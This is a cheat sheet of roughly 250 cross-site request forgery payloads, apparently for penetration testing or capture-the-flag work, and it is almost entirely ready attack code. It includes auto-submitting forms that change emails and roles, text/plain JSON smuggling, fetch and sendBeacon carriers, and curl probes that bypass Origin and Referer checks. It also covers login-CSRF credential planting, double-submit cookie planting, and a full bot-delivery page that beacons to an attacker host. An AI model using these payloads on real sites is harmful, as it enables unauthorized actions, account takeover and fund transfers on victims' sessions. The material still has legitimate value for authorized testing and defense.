# CSRF payload dictionary — the categorized corpus

~250 categorized payloads — delivery pages, body shapes, header
probes, cookie-attribute probes, and framework-specific forms. Each
carries the precondition it tests.

---

## 1. Delivery pages — the auto-submitting HTML

### form POST urlencoded — the baseline
```html
<form id="f" action="https://target/change" method="POST">
  <input name="email" value="attacker@evil.com">
  <input name="role" value="admin">
</form>
<script>document.getElementById('f').submit()</script>
```

### form POST text/plain JSON — the JSON-via-form
```html
<form id="f" action="https://target/update" method="POST" enctype="text/plain">
  <input name='{"a":"' value='x","i":"'}'>
</form>
<script>document.getElementById('f').submit()</script>
```

### form GET — the SameSite=Lax case
```html
<form id="f" action="https://target/transfer" method="GET">
  <input name="to" value="me"><input name="amount" value="1">
</form>
<script>document.getElementById('f').submit()</script>
```

### multipart form — a file/field carrier
```html
<form id="f" action="https://target/upload" method="POST" enctype="multipart/form-data">
  <input name="config" value='{"a":1}'>
  <input type="file" name="f" style="display:none">
</form>
<script>document.getElementById('f').submit()</script>
```

### iframe-targeted form — stays on page
```html
<iframe name="w" style="display:none"></iframe>
<form target="w" action="https://target/change" method="POST">
  <input name="a" value="1">
</form>
<script>document.forms[0].submit()</script>
```

### data: URL page — no external host needed
```
data:text/html,<form action="https://target/x" method="POST">
<input name="a" value="1"></form><script>document.forms[0].submit()
</script>
```

### referer-stripped page — for absent-referer gates
```html
<meta name="referrer" content="no-referrer">
<form action="https://target/x" method="POST">
  <input name="a" value="1">
</form><script>document.forms[0].submit()</script>
```

## 2. fetch/xhr bodies — the JS carriers

```js
// fetch no-cors + credentials — text/plain JSON
fetch('https://target/update',{method:'POST',mode:'no-cors',
  credentials:'include',headers:{'Content-Type':'text/plain'},
  body:'{"a":1,"i":"="}'})

// fetch no-cors urlencoded
fetch('https://target/change',{method:'POST',mode:'no-cors',
  credentials:'include',headers:
  {'Content-Type':'application/x-www-form-urlencoded'},
  body:'email=x@y.com&role=admin'})

// xhr withCredentials
var x=new XMLHttpRequest();
x.open('POST','https://target/update',true);x.withCredentials=true;
x.setRequestHeader('Content-Type','text/plain');
x.send('{"a":1,"i":"="}');

// sendBeacon — fires on unload too
navigator.sendBeacon('https://target/update',
  new Blob(['{"a":1,"i":"="}'],{type:'text/plain'}))

// EventSource GET
new EventSource('https://target/transfer?to=me&amount=1')
```

## 3. GET carriers — the sub-resource & top-nav set

```html
<!-- top-level navigations — attach Lax cookies -->
<a href="https://target/transfer?to=me&amount=1">x</a>
<script>location='https://target/transfer?to=me'</script>
<script>window.open('https://target/transfer?to=me')</script>
<meta http-equiv="refresh" content="0;url=https://target/x?a=1">

<!-- sub-resource — SameSite=None only -->
<img src="https://target/transfer?to=me&amount=1">
<script src="https://target/x?a=1"></script>
<link rel="stylesheet" href="https://target/x?a=1">
<iframe src="https://target/x?a=1"></iframe>
<video src="https://target/x?a=1"></video>
<object data="https://target/x?a=1"></object>
<embed src="https://target/x?a=1">
<svg><image href="https://target/x?a=1"/></svg>
<input type="image" src="https://target/x?a=1">
<body background="https://target/x?a=1">
<form action="https://target/x?a=1"><input type=submit></form>
```

## 4. JSON-body assemblies — text/plain shapes

```html
<!-- single field, = inside the value -->
<input name='{"name":"' value='csrf"}'>
<!-- {"name":"=csrf"} -->

<!-- two fields, = inside a real string field -->
<input name='{"user":"admin","pass":"x' value='=y"}'>
<!-- {"user":"admin","pass":"x=y"} -->

<!-- = inside a real free-text field -->
<input name='{"q":"' value='=x","page":1}'>
<!-- {"q":"=x","page":1} -->

<!-- dummy keys carry the =s -->
<input name='{"a":"1","i":"' value='","b":"2"}'>
<!-- {"a":"1","i":"=","b":"2"} -->

<!-- number field — = inside a string sibling -->
<input name='{"page":1,"s":"' value='","admin":true}'>
<!-- {"page":1,"s":"=","admin":true} -->

<!-- nested object -->
<input name='{"cfg":{"role":"' value='=admin"},"i":"x"}'>
<!-- {"cfg":{"role":"=admin"},"i":"x"} -->

<!-- array field -->
<input name='{"tags":["' value='=x"],"i":""}'>
<!-- {"tags":["=x"],"i":""} -->

<!-- a marker-only write -->
<input name='{"tag":"csrf-9f2ab1","i":"' value='"}'>
```

## 5. Header probes — the Origin/Referer surface

```bash
# foreign Origin — is it read?
curl -X POST "$BASE/x" -d 'a=1' -H 'Origin: https://evil.com' -b "$CJ"

# absent Origin — the fail-open
curl -X POST "$BASE/x" -d 'a=1' -H 'Origin:' -b "$CJ"

# Origin: null — the opaque-origin shape
curl -X POST "$BASE/x" -d 'a=1' -H 'Origin: null' -b "$CJ"

# substring-host Referer bypasses
for r in 'https://target.com.evil.com' 'https://evil.com/target.com' \
         'https://evil-target.com' 'https://target.com@evil.com' \
         'https://evil.com?target.com' 'null' ''; do
  curl -X POST "$BASE/x" -d 'a=1' -H "Referer: $r" -b "$CJ"; done
```

## 6. Token-strip / token-replay probes

```bash
# strip the token field — does the write still land?
curl -X POST "$BASE/x" -d 'a=1' -b "$CJ"          # no csrf field

# empty token
curl -X POST "$BASE/x" -d 'a=1&csrf=' -b "$CJ"

# null/undefined literal
curl -X POST "$BASE/x" -d 'a=1&csrf=null' -b "$CJ"
curl -X POST "$BASE/x" -d 'a=1&csrf=undefined' -b "$CJ"

# replay YOUR token — is it session-bound?
MYTOKEN=$(curl -s -b "$CJ" "$BASE/form" | grep -oE 'csrf" value="[^"]+"' | cut -d'"' -f3)
curl -X POST "$BASE/x" -d "a=1&csrf=$MYTOKEN" -b "$OTHER_CJ"

# coercible token
curl -X POST "$BASE/x" -d 'a=1&csrf=0' -b "$CJ"
```

## 7. SameSite probes — the cookie-attribute audit

```bash
# what attribute does the auth cookie carry?
curl -i -b "$CJ" "$BASE/" | grep -i 'set-cookie'
curl -i -X POST "$BASE/login" -d 'u=x&p=y' | grep -i 'set-cookie'

# read each: SameSite=Strict|Lax|None(+Secure)|missing
# the missing case → modern=Lax, old-bot=None-equivalent
```

## 8. Content-type probes — which the endpoint accepts

```bash
# does the endpoint parse text/plain JSON?
curl -X POST "$BASE/x" -H 'Content-Type: text/plain' \
  --data '{"a":1,"i":"="}' -b "$CJ"

# urlencoded
curl -X POST "$BASE/x" -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'a=1' -b "$CJ"

# multipart
curl -X POST "$BASE/x" -F 'a=1' -b "$CJ"

# a declared-JSON the form can't send — does it 415?
curl -X POST "$BASE/x" -H 'Content-Type: application/json' \
  --data '{"a":1}' -b "$CJ"
```

## 9. Login-CSRF shapes — the credential-plant write

```html
<!-- log the victim into the attacker's account -->
<form action="https://target/login" method="POST">
  <input name="username" value="attacker">
  <input name="password" value="attackerpass">
</form>
<script>document.forms[0].submit()</script>
<!-- the victim now browses as 'attacker' — their activity/deposits/
     flag-submissions land on YOUR account -->
```

```html
<!-- the SSOS shape — a text/plain JSON login that swaps the
     shared SSO token cookie -->
<form action="https://sso/login" method="POST" enctype="text/plain">
  <input name='{"user":"me","pass":"x","i":"' value='"}'>
</form>
<script>document.forms[0].submit()</script>
<!-- the login's Set-Cookie overwrites the shared token -->
```

## 10. The cookie-plant — setting the double-submit cookie

```html
<!-- a subdomain cookie-set primes the double-submit -->
<img src="https://sub.target/set-cookie?csrf=x">
<!-- then the form's csrf=x matches the planted cookie -->
<form action="https://target/x" method="POST">
  <input name="csrf" value="x"><input name="a" value="1">
</form>
```

## 11. The multi-write chain — two forms, two iframes

```html
<iframe name="w1" style="display:none"></iframe>
<iframe name="w2" style="display:none"></iframe>
<form target="w1" action="https://target/a" method="POST">
  <input name="x" value="1"></form>
<form target="w2" action="https://target/b" method="POST">
  <input name="y" value="2"></form>
<script>document.querySelectorAll('form').forEach(f=>f.submit())</script>
```

## 12. The bot-delivery composite — the full page

```html
<!doctype html><html><head>
<meta name="referrer" content="no-referrer">
</head><body>
<form id="f" action="http://127.0.0.1:1337/update" method="POST" enctype="text/plain">
  <input name='{"machine_id":"host-x","ignore":"' value='"}'>
</form>
<script>
  document.getElementById('f').submit();
  fetch('https://attacker/hit?d=1',{mode:'no-cors'});   // the OOB
</script>
</body></html>
```

## 13. The method-override shapes — when only GET ships

```text
a GET-write that takes method hints:
GET /transfer?to=me&_method=POST
GET /transfer?to=me&_method=PUT
GET /transfer?to=me&method=DELETE
a form's X-HTTP-Method-Override can't ship cross-origin — but a
query-param method hint can
```

## 14. The WebSocket-hijack shape — a ws/wss write

```js
var ws=new WebSocket('wss://target/ws');
ws.onopen=()=>ws.send(JSON.stringify({op:'update',data:{a:1}}));
// cookies attach on the handshake — SameSite handling varies by
// engine; the ws-hijack class covers the depth
```

## 15. The corpus index — when each shape applies

| Shape | When |
|---|---|
| form POST urlencoded | the endpoint reads form fields |
| form POST text/plain | the endpoint JSON-parses a text/plain body |
| form GET | GET write + Lax cookie |
| multipart | a file/field the endpoint reads |
| fetch no-cors | fire-and-forget, cookie attach |
| sendBeacon | background, unload-safe |
| img/script src | GET write, None cookie |
| a/meta/location | GET write, Lax cookie |
| login-CSRF | credential-plant into attacker's account |
| cookie-plant | double-submit bypass |
| ws-hijack | a ws write with cookie auth |
